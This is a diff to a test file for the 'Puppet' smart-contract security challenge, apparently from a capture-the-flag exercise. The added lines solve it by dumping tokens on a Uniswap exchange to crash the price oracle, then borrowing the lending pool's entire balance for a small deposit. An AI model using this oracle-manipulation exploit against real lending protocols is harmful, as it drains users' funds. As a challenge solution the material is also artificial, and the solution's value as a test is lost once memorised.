@@ -103,6 +103,10 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapExchange.address,ethers.utils.parseEther("999"))
+        let ethOut = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ethers.utils.parseEther("999"),ethers.utils.parseEther("9"),Math.floor(Date.now()/1000) + (60*10))
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,{value:ethers.utils.parseEther("24")})
+
     });
 
     after(async function () {
